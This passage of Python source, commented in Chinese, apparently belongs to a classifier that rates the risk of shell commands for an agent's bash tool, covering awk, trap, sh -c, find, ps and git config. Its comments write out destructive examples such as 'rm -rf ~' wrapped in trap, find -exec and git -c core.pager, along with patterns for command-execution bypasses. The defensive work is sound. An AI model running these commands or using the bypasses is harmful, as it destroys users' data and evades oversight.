                _recurse(arg, a, "sed 的 e 命令")


_AWK_READ = re.compile(r'getline\b[^;})|&>\n]*<\s*(?:"([^"]*)")?')   # getline x < "文件"：文件名不是字面量时位置不定
# 程序里执行命令、写文件、加载扩展。@名字( 是 gawk 的间接调用：名字是变量，取值可以是 system
_AWK_EFFECT = re.compile(r'system\s*\(|\|&?\s*getline|print[^;}]*(>|\|)|@(ns)?include|@load|(?<![\w".-])@\s*[A-Za-z_]\w*\s*\(')
# 运行时改写 ARGV：要读的文件换掉了，命令行上看不到
_AWK_ARGV = re.compile(r"\bARGV\s*\[[^\]]*\]\s*[-+*/%^]?=(?!=)|\b(?:g?sub|gensub|split|patsplit|match)\s*\([^;{}]*\bARGV\b")


def _awk(cmd: str, args: list[str], a: CommandAnalysis) -> None:
    script = _script_args(cmd, args)
    if script.loaded:
        a.bump("external", f"{cmd} 从文件加载程序或扩展（-f / -E / -i / -l），内容无法静态分析")
        a.inline = True
    elif _AWK_EFFECT.search(script.text):
        a.bump("external", f"{cmd} 程序里执行命令、写文件或加载扩展")
    elif _AWK_ARGV.search(script.text):
        a.bump("external", f"{cmd} 程序改写 ARGV，要读的文件在命令行上看不到")
    elif any(m[1] is None or _is_outside(m[1], a) for m in _AWK_READ.finditer(script.text)):
        a.bump("external", f"{cmd} 程序用 getline 读工作区外或位置不定的文件")
    elif any(c in "dop" for c, _, _ in script.opts):
        a.bump("write", f"{cmd} 把调试信息写入文件")
    else:
        a.bump("read", f"{cmd} 流式处理")


def _trap(args: list[str], a: CommandAnalysis) -> None:
    """``trap '命令' 信号``：命令会在收到信号或退出时执行（``trap 'rm -rf ~' EXIT``），按一条命令递归分析。
    执行时变量可能已经改了（``trap 'rm -rf $D/*' EXIT; D=~``），所以留到整条命令分析完再分析，见 analyze()。"""
    args = args[1:] if args[:1] == ["--"] else args
    if not args or args[0].startswith("-") or not args[0].strip():   # trap、trap -p、trap - EXIT、trap '' INT
        a.bump("read", "trap 列出或重置信号处理")
        return
    a.inline = True
    a.traps.append((args[0], set(a.sure)))


def _watch(args: list[str], a: CommandAnalysis) -> None:
    """``watch [选项] 命令``：命令交给 ``sh -c`` 反复执行（-x 时直接执行），按一条命令递归分析。"""
    i, direct = 0, False
    while i < len(args) and args[i].startswith("-"):
        direct = direct or args[i] in ("-x", "--exec")
        i += 2 if args[i] in ("-n", "--interval", "-q", "--equexit") else 1
    if i < len(args):
        _recurse(_requote(args[i:]) if direct else " ".join(args[i:]), a, "watch")


def _embedded_catastrophe(cmd: str, args: list[str], a: CommandAnalysis) -> None:
    """未知命令可能只是又套了一层：taskset 1 rm -rf ~、strace -f rm -rf ~、busybox rm -rf ~。
    从认得的高危命令名开始，把剩下的参数当成一条命令再分析，只采纳“灾难性”结论（等级仍按原命令处理）。"""
    if a.depth >= 3:
        return
    for i, w in enumerate(args[:16]):
        # 整条命令写在一个参数里：script -c 'rm -rf ~'、flock f -c 'rm -rf ~'。开头得是命令，说明文字不算
        words = w.split()
        whole = len(words) > 1
        head = (words[0] if whole else w).rsplit("/", 1)[-1]
        if head in _CATASTROPHE_HEADS or head.startswith("mkfs"):
            inner = analyze(w if whole else _requote(args[i:]), a.workspace, _depth=a.depth + 1, _scope=_scope_for(a, "same"))
            if inner.catastrophic:
                a.flag_catastrophic(f"{cmd} 包装执行：{inner.catastrophic_reason}")
            if inner.catastrophic or not whole:
                return


def _requote(words: list[str]) -> str:
    """把已经展开过的词重新拼成一条命令（find -exec、watch -x、包装命令直接执行它们，不再经过 shell）。
    不用 shlex.join：它会把还留着的 ``$D``（值未知的变量，可能为空）包进单引号变成字面量；这里用双引号，
    变量照样展开，shell 不展开的 $（_LIT）写成 ``\\$``。"""
    out = []
    for w in words:
        if re.fullmatch(r"[\w@%+=:,./~-]+", w):
            out.append(w)
        else:
            out.append('"' + re.sub(r'([\\"`])', r"\\\1", w).replace(_LIT, "\\$") + '"')
    return " ".join(out)


_SHELL_C = re.compile(r"-[A-Za-z]*c[A-Za-z]*")


def _shell_opts(args: list[str]) -> tuple[set[str], list[str]]:
    """拆开 shell 的选项，返回 (短选项字母, 选项之后的参数)。短选项可以合写（``-lc``、``-ec``、``-xc``）；
    ``-o``/``-O`` 与 ``--rcfile`` 这类选项带一个值。fish 的 ``--command``、``--init-command`` 就是 ``-c``，可以缩写，
    脚本放到返回的参数最前面。别的长选项是否带值没有表可查：后面跟一个词、再跟 ``-c`` 时这个词是它的值
    （``zsh --emulate sh -c '…'``）。"""
    letters: set[str] = set()
    scripts: list[str] = []
    i = 0
    while i < len(args):
        x = args[i]
        if x == "--":
            i += 1
            break
        if x in ("--rcfile", "--init-file"):
            i += 2
        elif x.startswith("--"):
            name, eq, val = x.partition("=")
            i += 1
            if len(name) > 2 and any(o.startswith(name) for o in ("--command", "--init-command")):
                letters.add("c")
                if not eq and i < len(args):
                    val = args[i]
                    i += 1
                scripts.append(val)
            elif not eq and i + 1 < len(args) and not args[i].startswith("-") and _SHELL_C.fullmatch(args[i + 1]):
                i += 1
        elif len(x) > 1 and x[0] in "-+":
            if x[0] == "-":
                letters |= set(x[1:])
            i += 2 if x[-1] in "oO" else 1
        else:
            break
    return letters, scripts + args[i:]


def _shell_script(args: list[str]) -> list[str] | None:
    """``bash -c`` 的脚本和它后面的参数（``$0``、``$1``……）：选项之后的词。没有 ``-c`` 时返回 None。"""
    letters, rest = _shell_opts(args)
    if "c" not in letters:
        return None
    return rest or [""]


def _shell_c(cmd: str, words: list[str], a: CommandAnalysis) -> None:
    """``sh -c 脚本 名字 参数……``：脚本后面的词绑到 ``$0``、``$1``…… 再分析（``sh -c 'rm -rf "$1"' _ ~``）。
    它们是取值，不会被当成命令再解析一遍。这些变量只在 -c 的子 shell 里算数，分析完恢复。"""
    script, *rest = words
    if not rest:
        _recurse(script, a, f"{cmd} -c")
        return
    for view in _arg_views(script.replace(_LIT, "$").split(), rest[1:], a):
        saved = _bind_positional(view, a)
        saved["0"] = (a.vars.get("0"), "0" in a.sure)
        a.vars["0"] = [rest[0]]
        a.sure.add("0")
        hidden = set(saved) - a.exported    # 子进程只看得到导出的变量，见 _scope_for
        a.exported |= hidden
        try:
            _recurse(script, a, f"{cmd} -c")
        finally:
            a.exported -= hidden
            _restore_positional(saved, a)


def _reads_stdin(args: list[str]) -> bool:
    """shell 从标准输入读脚本：没有 ``-c``，也没有脚本文件，或者写明了 ``-s``。"""
    letters, rest = _shell_opts(args)
    return "c" not in letters and (not rest or "s" in letters)


def _find_actions(args: list[str], a: CommandAnalysis) -> None:
    """``find`` 的删除与执行动作。起点路径会被自己的动作处理到（``find ~ -delete`` 删的就是整个家目录），
    所以 ``-exec`` 的命令把 ``{}`` 换成起点路径再递归分析：``find ~ -exec rm -rf {} +`` 等同 ``rm -rf ~``。"""
    i = 0
    roots: list[str] = []
    while i < len(args) and (args[i] in ("-H", "-L", "-P", "-E", "-X", "-d", "-s", "-x") or args[i].startswith("-O")
                             or args[i] in ("-D", "-f")):
        if args[i] == "-f":   # BSD find：-f 的值就是起点
            roots += args[i + 1:i + 2]
        i += 2 if args[i] in ("-D", "-f") else 1
    while i < len(args) and not args[i].startswith(("-", "(", "!", ")")):
        roots.append(args[i])
        i += 1
    roots = roots or ["."]
    if "-delete" in args:   # 根目录、家目录，以及它们下面一级（/usr、~/projects）：整棵删掉就是灾难
        hit = next((h for r in roots if (h := _root_hit(r, a, 1))), None)
        if hit:
            a.flag_catastrophic(f"find -delete 删除整棵目录树 {hit}")
        elif any(_has_ref(r) or _is_outside(r, a) for r in roots):
            a.bump("dangerous", "find -delete 删除工作区外的目录树，或者起点取决于变量")
    for j, x in enumerate(args):
        if x not in ("-exec", "-execdir", "-ok", "-okdir"):
            continue
        end = next((k for k in range(j + 1, len(args)) if args[k] in (";", "+")), len(args))
        action = args[j + 1:end]
        if not action:
            continue
        for root in roots:   # 起点再多也都看：分析预算管着总量，超了按灾难性拒绝
            _recurse(_requote([root if w == "{}" else w for w in action]), a, f"find {x}")


_PS_LONG_VALUES = {"--cols", "--columns", "--format", "--group", "--Group", "--lines", "--pid", "--ppid", "--quick-pid",
                   "--rows", "--sid", "--sort", "--tty", "--user", "--User", "--width"}


def _ps_shows_env(args: list[str]) -> bool:
    """ps 是否会打印进程环境：``-E``（macOS）或 BSD 风格的 ``e``（``ps eww``、``ps axe``，macOS 与 Linux 都是）。
    ``ps -e`` / ``ps -ef`` 是“所有进程”，不打印环境。带值的选项（``-p 1``、``-o pid``、``U deploy``）跳过它的值。"""
    takes_value = set("GgMNOopqtUuCs")
    skip = False
    for x in args:
        if skip:
            skip = False
            continue
        if x.startswith("--"):
            skip = x in _PS_LONG_VALUES   # ps --format etime：etime 是值，不是 BSD 写法的 e
            continue
        dash = x.startswith("-")
        word = x[1:] if dash else x
        letters = re.match(r"[A-Za-z]*", word)[0]     # ps -Ep1、ps ewwp$PPID：值紧贴在字母后面
        stops = takes_value if dash else {"o", "O"}   # ps -oETIME、ps axoetime：带值的字母之后都是值。BSD 写法里 u、s 不带值（ps auxe）
        letters = letters[:next((k + 1 for k, c in enumerate(letters) if c in stops), len(letters))]
        if ("E" in letters) if dash else ("e" in letters.lower()):
            return True
        skip = letters == word and word[-1:] in takes_value
    return False


def _recurse(script: str, a: CommandAnalysis, via: str, *, mode: str = "child", nest: bool = True) -> None:
    """``sh -c`` / ``eval`` 的字符串本身就是一条命令：递归分析（限制深度，防止构造的深层嵌套拖慢判定）。
    内层看得到外层的变量与当前目录。mode 为 child（``sh -c`` 这类新进程）时，没导出的变量在里面可能是空的；
    sub（命令替换、trap）与 same（``eval``）看得到全部变量，same 就在当前 shell 里执行，赋值与 cd 留到后面。"""
    a.inline = True
    if (nest and a.depth >= 3) or not script.strip():   # 别名、函数调用（nest=False）的层数由 _call 另外限制
        a.bump("external", f"{via} 嵌套过深或内容为空，无法静态分析")
        return
    if a.budget[0] <= 0:
        a.flag_catastrophic(_OVER_BUDGET)
        return
    if mode != "sub":
        script = _apply_prefix(script, a)
    inner = analyze(script.replace(_LIT, "$"), a.workspace, _depth=a.depth + nest, _scope=_scope_for(a, mode))
    a.bump(inner.level, f"{via}：{inner.reasons[0] if inner.reasons else '内层命令'}")
    a.reasons.extend(r for r in inner.reasons[1:] if r not in a.reasons)
    a.opaque = a.opaque or inner.opaque
    if inner.catastrophic and not a.catastrophic:
        a.catastrophic, a.catastrophic_reason = True, f"{via}：{inner.catastrophic_reason}"
    if inner.credential and not a.credential:
        a.credential, a.credential_reason = True, f"{via}：{inner.credential_reason}"
    a.network = a.network or inner.network
    if mode == "same":
        for name, values in inner.vars.items():
            _add_values(name, values, a)
        for c in inner.cwds:
            _add_cwd(c, a)
        a.exported |= inner.exported
        a.assigned |= inner.sure


# 值是一条命令的配置键：git -c core.pager='rm -rf ~' log 执行的就是 rm -rf ~
_GIT_EXEC_KEYS = re.compile(r"core\.(pager|sshcommand|fsmonitor|editor|hookspath|gitproxy|askpass)|diff\.external"
                            r"|sequence\.editor|credential\.([^=]*\.)?helper|[^=]*\.(command|program|textconv|cmd|clean|smudge"
                            r"|process|driver)", re.I)


# 仓库自己的配置也能让只读的 git 命令执行程序：.gitattributes 把文件交给 filter / diff 驱动之后，git diff、git log -p、
# git show 会运行 .git/config 里的 clean、smudge、textconv。驱动名是任意的，没法像 core.fsmonitor 那样在环境里统一关掉，
# 这里只看配置里有没有定义它们（include 引入的文件看不到，同样算上）；git-lfs 安装时写下的标准驱动只运行 git-lfs 本身，放行
_CFG_SECTION = re.compile(r'\[\s*([^\]\s"]+)(?:\s+"((?:[^"\\\n]|\\.)*)")?\s*\]')
_CFG_KEY = re.compile(r"([A-Za-z][\w-]*)\s*(?:=\s*(.*))?$")
_LFS_DRIVER = {"clean": "git-lfs clean -- %f", "smudge": "git-lfs smudge -- %f", "process": "git-lfs filter-process"}
_CONFIG_LIMIT = 1 << 20


def _config_programs(text: str) -> list[str]:
    """git 配置文本里定义的外部程序（filter / diff 驱动、diff.external、gpg.program）与 include。宁可多报。"""
    found, section = [], ""
    for line in text.lstrip("﻿").splitlines():
        line = line.strip()
        while m := _CFG_SECTION.match(line):   # 节头后面同一行还能再跟节头或变量
            name = m.group(1).lower()
            section = name if m.group(2) is None else f"{name}.{m.group(2)}"
            if name.split(".")[0] in ("include", "includeif"):
                found.append(f"[{section}]")
            line = line[m.end():].strip()
        k = _CFG_KEY.match(line)
        if not k:
            continue
        key, val, kind = k.group(1).lower(), (k.group(2) or "").strip().strip('"'), section.split(".")[0]
        if ((kind == "filter" and key in ("clean", "smudge", "process"))
                or (kind == "diff" and (key in ("textconv", "command") or (section == "diff" and key == "external")))
                or (kind == "gpg" and key == "program")) and _LFS_DRIVER.get(key) != val:
            found.append(f"{section}.{key}")
    return found


@functools.lru_cache(maxsize=64)
def _config_file_programs(path: str, mtime_ns: int, size: int) -> tuple[str, ...]:
    if size > _CONFIG_LIMIT:
        return (f"{os.path.basename(path)}（{size} 字节，过大未检查）",)
    try:
        with open(path, encoding="utf-8", errors="replace") as f:
            return tuple(_config_programs(f.read()))
    except OSError:
        return ()


def _repo_programs(workspace: str | None, chdir: str) -> list[str]:
    """命令要操作的仓库（从工作区或 -C 指定的目录向上找 .git，和 git 自己一样）在本地配置里定义的外部程序。"""
    if not workspace:
        return []
    d = os.path.realpath(os.path.join(_realroot(workspace), chdir))
    gitdirs: list[str] = []
    for _ in range(64):
        dot = os.path.join(d, ".git")
        if os.path.isdir(dot):
            gitdirs = [dot]
            break
        if os.path.isfile(dot):   # 工作树、子模块：.git 是一个写着 gitdir: <路径> 的文件
            try:
                with open(dot, encoding="utf-8", errors="replace") as f:
                    head = f.read(4096).strip()
            except OSError:
                return []
            if head.startswith("gitdir:"):
                gitdirs = [os.path.join(d, head[7:].strip())]
            break
        parent = os.path.dirname(d)
        if parent == d:
            return []
        d = parent
    for g in list(gitdirs):
        try:
            with open(os.path.join(g, "commondir"), encoding="utf-8", errors="replace") as f:
                gitdirs.append(os.path.join(g, f.read(4096).strip()))
        except OSError:
            pass
    found: list[str] = []
    for g in gitdirs:
        for name in ("config", "config.worktree"):
            try:
                st = os.stat(os.path.join(g, name))
            except OSError:
                continue
            found += _config_file_programs(os.path.join(g, name), st.st_mtime_ns, st.st_size)
    return found


def _git(args: list[str], a: CommandAnalysis) -> None:
    # 全局选项：-C <dir>、-c k=v、--git-dir=...。-c / --config-env 能指定外部程序（core.pager、alias.x=!cmd……），
    # --exec-path=<目录> 换掉 git 子命令的位置，--git-dir / --work-tree / --bare 指向别的仓库——那个仓库的配置同样能执行命令
    i, chdir = 0, ""
    while i < len(args) and args[i].startswith("-"):
        x = args[i]
        if x in ("-c", "--config-env") and i + 1 < len(args):
            _git_config(args[i + 1], a, from_env=x == "--config-env")
            i += 2
        elif x.startswith("--config-env="):
            _git_config(x.split("=", 1)[1], a, from_env=True)
            i += 1
        elif x.startswith("--exec-path="):
            a.bump("external", "git --exec-path 指定子命令所在的目录，可以执行任意程序")
            a.inline = True
            i += 1
        elif x in ("--git-dir", "--work-tree", "--bare") or x.startswith(("--git-dir=", "--work-tree=")):
            a.bump("external", f"git {x.split('=')[0]} 指向别处的仓库，那个仓库的配置（textconv、diff 驱动……）可以执行命令")
            i += 2 if x in ("--git-dir", "--work-tree") else 1
        elif x in ("-C", "--namespace", "--super-prefix") and i + 1 < len(args):
            if x == "-C":
                chdir = os.path.join(chdir, args[i + 1])
            i += 2
        else:
            i += 1
    sub, rest = (args[i], args[i + 1:]) if i < len(args) else ("", [])

    def read(reason: str) -> None:
        a.bump("read", reason)
        if None in a.cwds or _has_ref(chdir):
            # 不知道在哪个仓库里执行：那里的配置（core.fsmonitor、textconv……）同样可以执行命令
            a.bump("external", f"git {sub} 所在的目录取决于变量，那个仓库的配置可能定义了外部程序")
            a.opaque = True
        progs = list(dict.fromkeys(p for c in a.cwds if c is not None
                                   for p in _repo_programs(a.workspace, os.path.join(os.path.expanduser(c), chdir))))
        if progs:
            # 实际执行的程序写在仓库配置里、不在命令文本里：allow:bash(git diff*) 这类前缀规则也不能替人放行
            a.bump("external", f"仓库配置为 git 定义了外部程序（{'、'.join(progs[:3])}），git {sub} 可能执行它们")
            a.opaque = True
    if any(x.startswith("--output") or x in ("--ext-diff",) for x in rest):
        a.bump("write", f"git {sub} 带 --output/--ext-diff")
    flags = set(_git_flags(rest))
    positional = [x for x in rest if not x.startswith("-")]
    if not sub:
        a.bump("read", "git 全局查询（--version 等）")
    elif sub == "grep" and flags & {"-O", "--open-files-in-pager"}:
        a.bump("external", "git grep -O 会用指定的程序打开匹配的文件")
        a.inline = True
    elif sub in GIT_READ:
        read("git 只读命令")
    elif sub in _GIT_REFS:
        writes, lists = _GIT_REFS[sub]
        if flags & writes or (positional and not flags & lists):
            a.bump("write", f"git {sub} 会创建、删除或改动{'分支' if sub == 'branch' else '标签'}")
        else:
            read(f"git {sub} 列出引用")
    elif sub == "remote":
        action = positional[0] if positional else ""
        if action in ("", "get-url") or (action == "show" and "-n" in flags):
            read("git remote 列出远端")
        elif action in ("show", "update", "prune") or (action in ("add", "set-head") and flags & {"-f", "--fetch", "-a", "--auto"}):
            a.bump("external", f"git remote {action} 会访问远端")
            a.network = True
        else:
            a.bump("write", f"git remote {action} 修改远端配置")
    elif (sub, positional[:1]) in (("stash", ["list"]), ("stash", ["show"]), ("worktree", ["list"])) or \
            (sub == "reflog" and positional[:1] not in (["expire"], ["delete"])):
        read(f"git {sub} 只读查询")
    elif sub in GIT_EXTERNAL:
        if "--force" in rest or "-f" in rest or any(x.startswith(("+", "--force")) for x in rest):
            a.bump("dangerous", "强制推送会改写远端历史")
        else:
            a.bump("external", f"git {sub} 访问远端")
        a.network = True
    elif (sub == "reset" and _git_long(flags, "--hard")) or (
            sub == "clean" and ("-f" in flags or _git_long(flags, "--force"))
            and not ("-n" in flags or _git_long(flags, "--dry-run"))):
        a.bump("dangerous", f"git {sub} 会丢弃未提交的修改")
    elif sub in ("config", "submodule", "filter-branch"):
        a.bump("external", f"git {sub} 可能配置命令执行或访问远端")
    else:
        a.bump("write", f"git {sub} 修改仓库")


def _git_long(flags: set[str], name: str) -> bool:
    """长选项 name 写了没有：git 接受无歧义的前缀，``--forc`` 就是 ``--force``。"""
    return any(len(f) > 2 and name.startswith(f) for f in flags)


def _git_flags(args: list[str]):
    """选项逐个列出：长选项去掉 ``=值``，短选项簇拆开（``-Dr`` → ``-D``、``-r``）——合写的删除选项也要认得出来。"""
    for x in args:
        if x.startswith("--"):
            yield x.split("=", 1)[0]
        elif x.startswith("-") and len(x) > 1:
            yield from (f"-{c}" for c in x[1:])


def _git_config(kv: str, a: CommandAnalysis, *, from_env: bool = False) -> None:
    """``git -c 键=值`` / ``--config-env=键=环境变量``：只放行 GIT_SAFE_CONFIG 里的键。值是命令的键递归分析——
    bypass 模式也要认出 ``git -c alias.x='!rm -rf ~' x`` 这种灾难性命令。"""
    key, _, val = kv.partition("=")
    if GIT_SAFE_CONFIG.fullmatch(key):
        return
    a.inline = True
    if from_env:
        a.bump("external", f"git --config-env 设置 {key}，值来自环境变量，无法静态分析")
    elif val.startswith("!") or _GIT_EXEC_KEYS.fullmatch(key):
        a.bump("external", f"git -c {key} 可以执行任意命令")
        if val.strip("!"):
            _recurse(val.lstrip("!"), a, f"git -c {key}")
    else:
        a.bump("external", f"git -c {key} 不在无害配置清单内（可能指定外部程序或引入别的配置文件）")


def max_level(*levels: str) -> str:
    return max(levels, key=lambda x: _RANK[x])
